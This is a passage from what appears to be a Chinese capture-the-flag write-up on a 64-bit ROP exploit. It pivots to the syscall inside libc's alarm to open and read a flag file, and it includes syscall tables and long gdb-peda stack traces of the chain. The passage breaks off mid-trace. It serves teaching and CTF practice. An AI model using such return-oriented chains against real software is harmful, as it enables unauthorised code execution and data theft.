EOF <span class="token keyword">while</span> reading in interactive$  直接输出flag流</code></pre><h2 id="MASS"><a href="#MASS" class="headerlink" title="MASS"></a>MASS</h2><ul><li>在不同的libc文件中各函数可能偏移量有所不同，但是函数的实现一般是一样的所以函数内部偏移一般不变，就像这里alarm函数的sys call位置</li><li>既然有了syscall为啥不构造system：因为没有现成的/bin/sh，所以必然要进行两次输入，第一次输入payload第二次输入/bin/sh，但是输入了payload后就进行shutdown了，关闭了输入流。</li></ul><h3 id="32位系统调用常用"><a href="#32位系统调用常用" class="headerlink" title="32位系统调用常用"></a>32位系统调用常用</h3><table><thead><tr><th align="right">%eax</th><th align="center">Name</th><th align="center">Source</th><th align="center">%ebx</th><th align="center">%ecx</th><th align="center">%edx</th><th align="center">%esx</th><th align="left">%edi</th></tr></thead><tbody><tr><td align="right">1</td><td align="center">sys_exit</td><td align="center">kernel/exit.c</td><td align="center">int</td><td align="center">-</td><td align="center">-</td><td align="center">-</td><td align="left">-</td></tr><tr><td align="right">2</td><td align="center">sys_fork</td><td align="center">arch/i386/kernel/process.c</td><td align="center">struct pt_regs</td><td align="center">-</td><td align="center">-</td><td align="center">-</td><td align="left">-</td></tr><tr><td align="right">3</td><td align="center">sys_read</td><td align="center">fs/read_write.c</td><td align="center">unsigned int</td><td align="center">char * size_t</td><td align="center">-</td><td align="center">-</td><td align="left"></td></tr><tr><td align="right">4</td><td align="center">sys_write</td><td align="center">fs/read_write.c</td><td align="center">unsigned int</td><td align="center">const char * size_t</td><td align="center">-</td><td align="center">-</td><td align="left"></td></tr><tr><td align="right">5</td><td align="center">sys_open</td><td align="center">fs/open.c</td><td align="center">const char *</td><td align="center">int</td><td align="center">int</td><td align="center">-</td><td align="left">-</td></tr><tr><td align="right">11</td><td align="center">sys_execve</td><td align="center">arch/i386/kernel/process.c</td><td align="center">struct pt_regs</td><td align="center">NULL</td><td align="center">NULL</td><td align="center">-</td><td align="left">-</td></tr></tbody></table><h3 id="64位系统调用常用"><a href="#64位系统调用常用" class="headerlink" title="64位系统调用常用"></a>64位系统调用常用</h3><table><thead><tr><th align="right">%rax</th><th align="center">System call</th><th align="center">%rdi</th><th align="center">%rsi</th><th align="center">%rdx</th><th align="center">%r10</th><th align="center">%r8</th><th align="left">%r9</th></tr></thead><tbody><tr><td align="right">0</td><td align="center">sys_read</td><td align="center">unsigned int fd</td><td align="center">char *buf</td><td align="center">size_t count</td><td align="center"></td><td align="center"></td><td align="left"></td></tr><tr><td align="right">1</td><td align="center">sys_write</td><td align="center">unsigned int fd</td><td align="center">const char *buf</td><td align="center">size_t count</td><td align="center"></td><td align="center"></td><td align="left"></td></tr><tr><td align="right">2</td><td align="center">sys_open</td><td align="center">const char *filename</td><td align="center">int flags</td><td align="center">int mode</td><td align="center"></td><td align="center"></td><td align="left"></td></tr><tr><td align="right">59</td><td align="center">sys_execve</td><td align="center">const char *filename</td><td align="center">const char *const argv[]</td><td align="center">const char *const envp[]</td><td align="center"></td><td align="center"></td><td align="left"></td></tr><tr><td align="right">60</td><td align="center">sys_exit int</td><td align="center">error_code</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="left"></td></tr></tbody></table><h3 id="用alarm-got代替alarm-plt"><a href="#用alarm-got代替alarm-plt" class="headerlink" title="用alarm_got代替alarm_plt"></a>用alarm_got代替alarm_plt</h3><p><strong>一句话：调试是检验真理的唯一标准</strong><br>在使用alarm_plt作为ret对象时：</p><pre class=" language-java"><code class="language-java">   <span class="token number">0x4006f3</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">19</span><span class="token operator">></span><span class="token operator">:</span>        mov    BYTE PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x20098e</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x1</span>        # <span class="token number">0x601088</span> <span class="token operator">&lt;</span>completed<span class="token number">.6963</span><span class="token operator">></span>   <span class="token number">0x4006fa</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">26</span><span class="token operator">></span><span class="token operator">:</span>    repz ret    <span class="token number">0x4006fc</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">28</span><span class="token operator">></span><span class="token operator">:</span>    pop    rax<span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x4006fd</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">29</span><span class="token operator">></span><span class="token operator">:</span>    ret       <span class="token number">0x4006fe</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdx   <span class="token number">0x4006ff</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">31</span><span class="token operator">></span><span class="token operator">:</span>    ret       <span class="token number">0x400700</span> <span class="token operator">&lt;</span>frame_dummy<span class="token operator">></span><span class="token operator">:</span>    mov    edi<span class="token punctuation">,</span><span class="token number">0x600e18</span>   <span class="token number">0x400705</span> <span class="token operator">&lt;</span>frame_dummy<span class="token operator">+</span><span class="token number">5</span><span class="token operator">></span><span class="token operator">:</span>    cmp    QWORD PTR <span class="token punctuation">[</span>rdi<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13628</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4005f0</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13630</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a3</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">99</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdi<span class="token punctuation">)</span><span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13638</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x3</span> <span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13640</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a1</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">97</span><span class="token operator">></span><span class="token operator">:</span>    pop    rsi<span class="token punctuation">)</span><span class="token number">0032</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13648</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x601260</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0040</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13650</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0048</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13658</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4006fe</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdx<span class="token punctuation">)</span><span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13660</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x64</span> <span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token number">0x00000000004006fd</span> in <span class="token function">__do_global_dtors_aux</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token operator">-</span>peda$ </code></pre><p><strong>ni</strong></p><pre class=" language-java"><code class="language-java"><span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x4005f0</span> <span class="token operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200a32</span><span class="token punctuation">]</span>        # <span class="token number">0x601028</span> <span class="token operator">|</span> <span class="token number">0x4005f6</span> <span class="token operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x2</span> <span class="token operator">|</span> <span class="token number">0x4005fb</span> <span class="token operator">&lt;</span>alarm<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token operator">:</span>    jmp    <span class="token number">0x4005c0</span> <span class="token operator">|</span> <span class="token number">0x400600</span> <span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200a2a</span><span class="token punctuation">]</span>        # <span class="token number">0x601030</span> <span class="token operator">|</span> <span class="token number">0x400606</span> <span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x3</span> <span class="token operator">|</span><span class="token operator">-</span><span class="token operator">></span>   <span class="token number">0x7f8b0f452845</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">5</span><span class="token operator">></span><span class="token operator">:</span>    syscall        <span class="token number">0x7f8b0f452847</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">7</span><span class="token operator">></span><span class="token operator">:</span>    cmp    rax<span class="token punctuation">,</span><span class="token number">0xfffffffffffff001</span>       <span class="token number">0x7f8b0f45284d</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">13</span><span class="token operator">></span><span class="token operator">:</span>    jae    <span class="token number">0x7f8b0f452850</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span>       <span class="token number">0x7f8b0f45284f</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">15</span><span class="token operator">></span><span class="token operator">:</span>    ret                                                                  JUMP is taken<span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13630</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a3</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">99</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdi<span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13638</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x3</span> <span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13640</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a1</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">97</span><span class="token operator">></span><span class="token operator">:</span>    pop    rsi<span class="token punctuation">)</span><span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13648</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x601260</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0032</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13650</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0040</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13658</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4006fe</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdx<span class="token punctuation">)</span><span class="token number">0048</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13660</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x64</span> <span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span><span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0x7ffee8e13668</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x400600</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200a2a</span><span class="token punctuation">]</span>        # <span class="token number">0x601030</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token number">0x00000000004005f0</span> in alarm<span class="token annotation punctuation">@plt</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token operator">-</span>peda$ </code></pre><p><strong>这里的plt使用了[]，就可以取0x601030表地址上的值作为jmp目标</strong></p><p>在使用alarm_plt作为ret对象时：</p><pre class=" language-java"><code class="language-java"><span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x4006fd</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">29</span><span class="token operator">></span><span class="token operator">:</span>    ret       <span class="token number">0x4006fe</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdx   <span class="token number">0x4006ff</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">31</span><span class="token operator">></span><span class="token operator">:</span>    ret       <span class="token number">0x400700</span> <span class="token operator">&lt;</span>frame_dummy<span class="token operator">></span><span class="token operator">:</span>    mov    edi<span class="token punctuation">,</span><span class="token number">0x600e18</span>   <span class="token number">0x400705</span> <span class="token operator">&lt;</span>frame_dummy<span class="token operator">+</span><span class="token number">5</span><span class="token operator">></span><span class="token operator">:</span>    cmp    QWORD PTR <span class="token punctuation">[</span>rdi<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60548</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x601028</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7fdc88808845</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">5</span><span class="token operator">></span><span class="token operator">:</span>    syscall<span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60550</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a3</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">99</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdi<span class="token punctuation">)</span><span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60558</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x3</span> <span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60560</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a1</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">97</span><span class="token operator">></span><span class="token operator">:</span>    pop    rsi<span class="token punctuation">)</span><span class="token number">0032</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60568</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x601260</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0040</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60570</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0048</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60578</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4006fe</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdx<span class="token punctuation">)</span><span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60580</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x64</span> <span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token number">0x00000000004006fd</span> in <span class="token function">__do_global_dtors_aux</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token operator">-</span>peda$ </code></pre><p><strong>ni</strong></p><pre class=" language-java"><code class="language-java">RDI<span class="token operator">:</span> <span class="token number">0x601058</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x67616c66</span> <span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span>RBP<span class="token operator">:</span> <span class="token function">0x4141414141414141</span> <span class="token punctuation">(</span><span class="token string">'AAAAAAAA'</span><span class="token punctuation">)</span>RSP<span class="token operator">:</span> <span class="token number">0x7ffcc4e60550</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a3</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">99</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdi<span class="token punctuation">)</span>RIP<span class="token operator">:</span> <span class="token number">0x601028</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7fdc88808845</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">5</span><span class="token operator">></span><span class="token operator">:</span>    syscall<span class="token punctuation">)</span>R8 <span class="token operator">:</span> <span class="token function">0x7fdc88d224c0</span> <span class="token punctuation">(</span><span class="token number">0x00007fdc88d224c0</span><span class="token punctuation">)</span>R9 <span class="token operator">:</span> <span class="token number">0x0</span> R10<span class="token operator">:</span> <span class="token number">0x0</span> R11<span class="token operator">:</span> <span class="token number">0x246</span> R12<span class="token operator">:</span> <span class="token function">0x400630</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>_start<span class="token operator">></span><span class="token operator">:</span>    xor    ebp<span class="token punctuation">,</span>ebp<span class="token punctuation">)</span>R13<span class="token operator">:</span> <span class="token number">0x7ffcc4e605c0</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> R14<span class="token operator">:</span> <span class="token number">0x0</span> R15<span class="token operator">:</span> <span class="token number">0x0</span>EFLAGS<span class="token operator">:</span> <span class="token function">0x10202</span> <span class="token punctuation">(</span>carry parity adjust zero sign trap INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>code<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x601028</span><span class="token operator">:</span>    mov    BYTE PTR <span class="token punctuation">[</span>r8<span class="token operator">+</span><span class="token number">0x7fdc88</span><span class="token punctuation">]</span><span class="token punctuation">,</span>r8b   <span class="token number">0x60102f</span><span class="token operator">:</span>    add    BYTE PTR <span class="token punctuation">[</span>rax<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dh   <span class="token number">0x601032</span><span class="token operator">:</span>    or     DWORD PTR <span class="token punctuation">[</span>rax<span class="token operator">+</span><span class="token number">0x7fdc</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0xfffffff0</span>   <span class="token number">0x601039</span><span class="token operator">:</span>    push   rdx<span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60550</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a3</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">99</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdi<span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60558</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x3</span> <span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60560</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4008a1</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">97</span><span class="token operator">></span><span class="token operator">:</span>    pop    rsi<span class="token punctuation">)</span><span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60568</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x601260</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0032</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60570</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0040</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60578</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4006fe</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span><span class="token operator">:</span>    pop    rdx<span class="token punctuation">)</span><span class="token number">0048</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60580</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x64</span> <span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span><span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0x7ffcc4e60588</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x400600</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200a2a</span><span class="token punctuation">]</span>        # <span class="token number">0x601030</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token 